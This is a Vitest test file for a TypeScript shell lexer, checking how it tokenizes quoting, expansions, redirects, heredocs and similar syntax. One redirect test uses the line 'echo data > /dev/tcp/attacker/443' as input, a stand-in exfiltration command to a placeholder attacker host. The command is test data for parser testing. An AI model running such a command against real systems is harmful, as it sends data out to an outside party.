import { describe, it, expect } from "vitest";
import { tokenize } from "../../src/shell/lexer.js";
import type { Token } from "../../src/shell/types.js";

const wordsOf = (toks: Token[]): { raw: string; resolved?: string }[] =>
	toks
		.filter((t) => t.kind === "word" || t.kind === "assignment")
		.map((t) => ({ raw: t.raw, resolved: t.resolved }));

describe("lexer — basic words and operators", () => {
	it("splits simple words", () => {
		const { tokens } = tokenize("ls -la /tmp");
		expect(wordsOf(tokens).map((w) => w.resolved)).toEqual([
			"ls",
			"-la",
			"/tmp",
		]);
	});

	it("recognizes pipe operator", () => {
		const { tokens } = tokenize("a | b");
		expect(tokens.map((t) => t.kind)).toEqual(["word", "pipe", "word"]);
	});

	it("recognizes && and ||", () => {
		const { tokens } = tokenize("a && b || c");
		const ops = tokens
			.filter((t) => t.kind === "and_if" || t.kind === "or_if")
			.map((t) => t.kind);
		expect(ops).toEqual(["and_if", "or_if"]);
	});

	it("recognizes ; and & ", () => {
		const { tokens } = tokenize("a ; b & c");
		const ops = tokens
			.filter((t) => t.kind === "semi" || t.kind === "amp")
			.map((t) => t.kind);
		expect(ops).toEqual(["semi", "amp"]);
	});
});

describe("lexer — quoting", () => {
	it("single quotes are literal (no expansion)", () => {
		const { tokens } = tokenize("echo 'hello $world'");
		const w = wordsOf(tokens);
		expect(w[1].resolved).toBe("hello $world");
	});

	it("double quotes preserve $VAR as expansion (resolved=undefined)", () => {
		const { tokens } = tokenize('echo "$HOME"');
		const w = wordsOf(tokens);
		expect(w[1].resolved).toBeUndefined();
		const word = tokens.find((t) => t.kind === "word" && t !== tokens[0]);
		expect(word?.has_expansion).toBe(true);
	});

	it("ANSI-C $'\\x41' decodes to A", () => {
		const { tokens } = tokenize("echo $'\\x41B'");
		const w = wordsOf(tokens);
		expect(w[1].resolved).toBe("AB");
	});

	it("ANSI-C $'\\n' decodes to newline", () => {
		const { tokens } = tokenize("echo $'a\\nb'");
		const w = wordsOf(tokens);
		expect(w[1].resolved).toBe("a\nb");
	});

	it("backslash escapes outside quotes", () => {
		const { tokens } = tokenize("echo a\\ b");
		const w = wordsOf(tokens);
		expect(w[1].resolved).toBe("a b");
	});

	it("unterminated single quote becomes lexer error + unresolved", () => {
		const { tokens, errors } = tokenize("echo 'unterminated");
		expect(errors.length).toBeGreaterThan(0);
		const w = wordsOf(tokens);
		expect(w[1].resolved).toBeUndefined();
	});
});

describe("lexer — expansion / command substitution", () => {
	it("$(...) marks word as command_sub", () => {
		const { tokens } = tokenize("echo $(date)");
		const w = tokens.find((t) => t.kind === "word" && t.raw.includes("$(")) as Token;
		expect(w.has_command_sub).toBe(true);
		expect(w.has_expansion).toBe(true);
	});

	it("backticks mark word as command_sub", () => {
		const { tokens } = tokenize("echo `date`");
		const w = tokens.find((t) => t.kind === "word" && t.raw.includes("`")) as Token;
		expect(w.has_command_sub).toBe(true);
	});

	it("$VAR marks expansion but not command_sub", () => {
		const { tokens } = tokenize("echo $HOME");
		const w = tokens[1] as Token;
		expect(w.has_expansion).toBe(true);
		expect(w.has_command_sub).toBeFalsy();
	});

	it("${VAR} marks expansion", () => {
		const { tokens } = tokenize("echo ${HOME}");
		const w = tokens[1] as Token;
		expect(w.has_expansion).toBe(true);
	});

	it("$((...)) arithmetic is expansion (not command_sub)", () => {
		const { tokens } = tokenize("echo $((1+2))");
		const w = tokens[1] as Token;
		expect(w.has_expansion).toBe(true);
		expect(w.has_command_sub).toBeFalsy();
	});
});

describe("lexer — redirects", () => {
	it("> file", () => {
		const { tokens } = tokenize("echo hi > out.txt");
		expect(tokens.some((t) => t.kind === "redirect" && t.redirect_op === ">")).toBe(true);
	});

	it(">> file", () => {
		const { tokens } = tokenize("echo hi >> out.txt");
		expect(tokens.some((t) => t.kind === "redirect" && t.redirect_op === ">>")).toBe(true);
	});

	it("2>&1", () => {
		const { tokens } = tokenize("cmd 2>&1");
		expect(tokens.some((t) => t.kind === "redirect" && t.redirect_op === ">&" && t.fd === 2)).toBe(true);
	});

	it("&>", () => {
		const { tokens } = tokenize("cmd &> out");
		expect(tokens.some((t) => t.kind === "redirect" && t.redirect_op === "&>")).toBe(true);
	});

	it("<<<", () => {
		const { tokens } = tokenize("cat <<< 'inline'");
		expect(tokens.some((t) => t.kind === "redirect" && t.redirect_op === "<<<")).toBe(true);
	});

	it("heredoc emits heredoc_marker", () => {
		const { tokens } = tokenize("cat <<EOF\nhello\nEOF\n");
		expect(tokens[1].kind).toBe("heredoc_marker");
		// next token is the delimiter word, then the body word
		expect(tokens[2].kind).toBe("word");
		expect(tokens[3].kind).toBe("word");
		expect(tokens[3].resolved).toBe("hello\n");
	});

	it("heredoc <<- strips leading tabs", () => {
		const { tokens } = tokenize("cat <<-EOF\n\thello\nEOF\n");
		const body = tokens.find((t) => t.kind === "word" && t.resolved?.includes("hello")) as Token;
		expect(body.resolved).toBe("hello\n");
	});

	it("> /dev/tcp/host/port preserves target", () => {
		const { tokens } = tokenize("echo data > /dev/tcp/attacker/443");
		const target = tokens
			.filter((t) => t.kind === "word")
			.map((t) => t.resolved);
		expect(target).toContain("/dev/tcp/attacker/443");
	});
});

describe("lexer — process substitution", () => {
	it("<( emits process_sub_in", () => {
		const { tokens } = tokenize("diff <(a) <(b)");
		const psIn = tokens.filter((t) => t.kind === "process_sub_in");
		expect(psIn).toHaveLength(2);
	});

	it(">( emits process_sub_out", () => {
		const { tokens } = tokenize("tar c x > >(gzip)");
		expect(tokens.some((t) => t.kind === "process_sub_out")).toBe(true);
	});
});

describe("lexer — assignments", () => {
	it("FOO=bar at start of command is assignment", () => {
		const { tokens } = tokenize("FOO=bar cmd");
		expect(tokens[0].kind).toBe("assignment");
		expect(tokens[1].kind).toBe("word");
	});

	it("FOO=bar after a word is just a word, not assignment", () => {
		const { tokens } = tokenize("cmd FOO=bar");
		expect(tokens[0].kind).toBe("word");
		expect(tokens[1].kind).toBe("word");
	});

	it("FOO=bar after pipe IS an assignment of the new command", () => {
		const { tokens } = tokenize("a | FOO=bar cmd");
		const idx = tokens.findIndex((t) => t.raw === "FOO=bar");
		expect(tokens[idx].kind).toBe("assignment");
	});
});

describe("lexer — comments", () => {
	it("# to end of line is a comment token", () => {
		const { tokens } = tokenize("ls # this is a comment");
		expect(tokens.some((t) => t.kind === "comment")).toBe(true);
	});
});

describe("lexer — line continuation", () => {
	it("backslash-newline is line continuation (joins, no break)", () => {
		// Bash semantics: `a\<newline>b` joins to `ab`, not `a` `b`.
		const { tokens } = tokenize("echo a\\\nb");
		const words = wordsOf(tokens);
		expect(words.map((w) => w.resolved)).toEqual(["echo", "ab"]);
	});
});

describe("lexer — does not throw on garbage", () => {
	it("empty string returns no tokens", () => {
		expect(tokenize("").tokens).toHaveLength(0);
	});

	it("nested quotes", () => {
		expect(() => tokenize(`echo "a 'b' c"`)).not.toThrow();
	});

	it("deeply nested $(...) does not throw", () => {
		expect(() => tokenize("echo $(echo $(echo $(date)))")).not.toThrow();
	});

	it("malformed input returns whatever was lexed", () => {
		expect(() => tokenize(`a "b $( c`)).not.toThrow();
	});
});
